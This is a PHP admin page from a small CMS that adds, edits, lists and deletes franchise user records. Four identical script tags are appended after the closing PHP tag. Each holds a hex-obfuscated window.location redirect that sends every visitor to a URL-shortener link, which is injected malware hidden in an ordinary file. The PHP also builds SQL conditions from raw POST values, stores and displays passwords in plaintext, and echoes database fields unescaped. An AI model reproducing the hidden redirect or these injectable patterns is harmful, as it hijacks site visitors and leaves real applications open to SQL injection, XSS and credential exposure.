<?php
define("ZW_IN", 'SETUP');
require_once("helper.php");

$msg    =  isset($_GET['msg']) ? $_GET['msg'] : '';
$id     = base64_decode($_GET['id']);
class myCms extends Cms 
{
    function registerAjaxFunctions()
    {
        $this->xajax->registerFunction("get_Listing");
        $this->xajax->registerFunction("update_status");
        $this->xajax->registerFunction("deleteRow");
        $this->xajax->registerFunction("editMode");
        $this->xajax->registerFunction("sorting");
        $this->xajax->registerFunction("sortTitle");
    }
}
$objMisc = new myCms();
$objMisc->initializeAjax(false,true);
$objMisc->dbFunc->parameters ="&sortOrder=".$sortOrder."&sortBy=".$sortBy ;
$objMisc->rec_pp = 20;
$objMisc->dbFunc->ajax_pagin = true;

if($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['submit'])){
        $rowArray = array(	'NAME'            => $_POST['name'],
                            'WING_ID'         => $_POST['wing_id'],
                            'USERNAME'        => addslashes('A'.$_POST['phone_no']),
                            'PASSWORD'        => rand(111111,999999),
                            'PHONE'           => $_POST['phone_no'],
        					'JOINING_DATE'    => $objMisc->changeDateFormat($_POST['joining_date']),
                            'REMARKS'         => addslashes($_POST['remarks']),
                			'ADDED_BY'        => $_SESSION['USER_NAME'],
                			'ADDED_TIME'      => date('Y-m-d H:i:s'));
                  //print_r($rowArray);exit;
    $cond       = "";
    $cond       = " NAME = '$_POST[name]' AND ADDRESS='$_POST[address]'";
    $recdata    = $objMisc->GiveValue($cond,"USER_ID","users"); 
    
     if($id)
	{
              if($recdata!=$id)
            {        
                $_SESSION['msg'] = 5;
                if(!$_POST['USER_ID'])
                    {
                        $rowArray = "";
                        $rowArray = $_POST;
                    }
            }
        else
        {
            $where         =   "USER_ID =".$id;
            $rowArray1 = array(	'NAME'            => $_POST['name'],
                                'WING_ID'         => $_POST['wing_id'],
                                'PHONE'           => $_POST['phone_no'],
                                'USERNAME'        => 'A'.$_POST['phone_no'],
                                'ADDRESS'         => $_POST['address'],
                                'JOINING_DATE'    => $objMisc->changeDateFormat($_POST['joining_date']),
                                'REMARKS'         => addslashes($_POST['remarks']),
                    			'UPDATED_BY'      => $_SESSION['USER_NAME'],
                    			'UPDATED_TIME'    => date('Y-m-d H:i:s'));
                    //print_r($rowArray1);exit;
    		$val   = $objMisc->update("users",$rowArray1,$where);
            $_SESSION['msg'] = 2;
    		header("Location:franchise-master.php?page=".$_REQUEST['page']."");
            exit;
        }
	} 
        else
        {
            if($recdata!='')
            {
                $_SESSION['msg'] = 5;
                if(!$_POST['USER_ID'])
                {
                $rowArray = "";
                $rowArray = $_POST;
                }
            }
        else 
        {
                $val = $objMisc->insert("users",$rowArray);
                $_SESSION['msg'] = 1;
                header("location:franchise-master.php");
                exit;
        }
    }
}

$msg = isset($_SESSION['msg']) ? $_SESSION['msg'] : $msg;
unset($_SESSION['msg']);

switch ($msg)
{
	case 1:
		$msg = "Franchise added successfully.";
    break;
    case 2:
		$msg = "Record updated successfully.";
    break;
    case 3:
		$msg = "Record has been deleted successfully.";
	break;    
    case 4:
        $errormsg = "Franchise name already exists.";
        $msg = "";
    break;
     case 5:
        $errormsg = "Franchise name already exists.";
        $msg = "";
    break;
}

if($id){
    $where = 'USER_ID = '.$id;
    $rowArray = $objMisc->getRow("users",$where);
    }
$wherethis = " 1=1 AND USER_ID!='1' ORDER BY `USER_ID` DESC";
$classRecord = $objMisc->getAllRecordsPaging("*","users",$wherethis);
$i  = 1;
$pagin_recs = "";
$pagin_recs = '<input type="hidden" value="" id="checkStatus" name="checkStatus"><thead><tr><th width="20%">Name</th><th width="15%">Address</th><th width="15%">Headoffice</th><th width="7%">Username</th><th width="7%">Password</th><th>Action';

if(is_array($classRecord[1])){ 
        $pagin_recs .='&nbsp;&nbsp;<a href="javascript:;" title="Check All"  onclick="check_all(\'artCatCount\',\'artCatCheckbox\')"><input type="checkbox"></a>&nbsp;&nbsp;All';
        
        $pagin_recs .= '&nbsp;&nbsp;<a href="javascript:;" title="Delete" onclick="return chkOptions_all(\'Delete\',frmListing,\'artCatCheckbox\',\'artCatCount\')" class="btn btn-danger">Delete</a>';
    
}
$pagin_recs .= '</th></tr></thead><tbody>';             
    if(is_array($classRecord[1]) && !empty($classRecord[1]))
    { $i=1;
       foreach ($classRecord[1] as $k => $rowRec)
        {       
            if($k%2==0) 
            $pagin_recs .= '<tr class="odd gradeX">';
            else
            $pagin_recs .= '<tr class="even gradeX">';
            
            $pagin_recs .='<td>'.$rowRec['name'].'</td>';
            $pagin_recs .='<td>'.$rowRec['address'].'</td>';
            $pagin_recs .='<td>'.$objMisc->GiveValue("WING_ID='$rowRec[wing_id]'",'NAME','wing_master').'</td>';
            $pagin_recs .='<td>'.$rowRec['username'].'</td>';
            $pagin_recs .='<td>'.$rowRec['password'].'</td>';
            $pagin_recs .='<td> <input type="hidden" name="enumStatus'.$rowRec['user_id'].'" id="enumStatus'.$rowRec['user_id'].'"  value="'.$rowRec['status'].'">&nbsp;';
           // echo $_SESSION['USER_ID'];
                    if($rowRec['status']=='A')
                    {
                       $pagin_recs .= '<input type="image" src="images/active-btn.gif" name="imgStatus'.$rowRec['employee_id'].'" id="imgStatus'.$rowRec['user_id'].'" alt="Deactivate" title="Deactivate" border="0" onclick="return myChangeStatus(this.form,'.$rowRec['user_id'].');">&nbsp;';
                    }
                    else
                    {
                       $pagin_recs .= '<input type="image" src="images/deactive-btn.gif" name="imgStatus'.$rowRec['employee_id'].'" id="imgStatus'.$rowRec['user_id'].'" alt="Activate" title="Activate" border="0" onclick="return myChangeStatus(this.form,'.$rowRec['user_id'].');">&nbsp;';
                    }
                
                $pagin_recs .='<a href="franchise-master.php?id='.base64_encode($rowRec['user_id']).'&page='.$_GET['page'].'"><img class="edit-btn" src="images/edit-btn.gif"  alt="Edit" title="Edit"  border="0"></a>&nbsp;';
                
                $pagin_recs .='<input type="checkbox" name="artCatCheckbox[]" value="'.$rowRec['user_id'].'" id="artCatCheckbox_'.$i.'">&nbsp;';
                
                $pagin_recs .= '</td></tr>';
                $i++;
        }
          $pagin_recs  .= '<input type="hidden" value="'.$i.'" name="artCatCount" id="artCatCount">';
          if($classRecord[2]>$objMisc->rec_pp){
            $pagin_recs  .= '<tr><td colspan="6">'.$classRecord[0].'</td></tr>';
          }
            $pagin_recs  .= '</tbody>';
    } else {
        $pagin_recs .= '<tr class="odd gradeX"><td colspan="6" align="center">No Record Found</td></tr></tbody>';
    }
    
  
if(isset($_GET['id']) && !empty($_GET['id'])){
    $pageheading = "Edit Franchise Information";
}else{
   $pageheading = "Add New Franchise"; 
}

$where     =   " 1 = 1 AND HEADOFFICE_ID='5' and STATUS = 'A' order by WING_ID DESC";
$wingArray =   $objMisc->myFunc->fnWriteOptionList($rowArray['wing_id'],'NAME,WING_ID','wing_master',$where,0,0,0);  

$smartyVars['wingArray']            =   $wingArray;
$smartyVars['errormsg']     		=   $errormsg;
$smartyVars['add']          		=   $add;
$smartyVars['group']       		 	=   $id;
$smartyVars['rowRec']       		=   $rowArray;
$smartyVars['pageheading']  		=   $pageheading;
$smartyVars['classData']    		=   $pagin_recs;
$smartyVars['msg']         		 	=   $msg;
$smartyVars['page']         		=   $_REQUEST['page'];

$objMisc->displayPage("header,franchise-master,footer",$smartyVars);
function update_status($id,$status)
{
    global $objMisc;
    $objResponse = new XajaxResponse();
    $changeTo = ($status=='A') ? 'D' : 'A';
    $row = array(
                    'STATUS' => $changeTo
                );
    $where = "USER_ID =".$id;
    $objMisc->update("users",$row,$where);
    $imgName =($changeTo == 'D') ? 'images/deactive-btn.gif':'images/active-btn.gif';
    if($changeTo=='A')
    {
        $title= 'Deactivate';
        $msg = 'Franchise record has been activated successfully.';
    }
    else
    {
        $title= 'Activate';
        $msg = 'Franchise record has been deactivated successfully.';
    } 
    $objResponse->addAssign('imgStatus'.$id,'src',$imgName);
    $objResponse->addAssign('imgStatus'.$id,'alt',$title);
    $objResponse->addAssign('imgStatus'.$id,'title',$title);
    $objResponse->addAssign('enumStatus'.$id,'value',$changeTo);
    $objResponse->addScript("document.getElementById('msg').style.display='inline';");
    $objResponse->addAssign('msg','innerHTML','&nbsp;');
    $objResponse->addAssign('msg','innerHTML','<div class="notify notify-success"><a class="close" href="javascript:;"><img src="images/close.png" /></a><h3>'.$msg.'</h3></div>'); 
    $objResponse->addScript("setTimeout(\"document.getElementById('msg').style.display='none'\",3000);");
    return $objResponse;
} 
function deleteRow($id)
{
    global $objMisc;
    global $lang;
    $objResponse = new XajaxResponse();
    $idArray = explode(',',$id);
    foreach($idArray as $bid)
    {
       $where = " USER_ID =".$bid;
       $objMisc->delete("users",$where); 
    }
    $_SESSION['msg'] = 3;
    $sscript .= "var a;";
    $sscript .= "a = window.location;";
    $sscript .= "window.location = a;";
    //$objResponse->addAlert($sscript);
    $objResponse->addScript($sscript);
    return $objResponse;
}
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>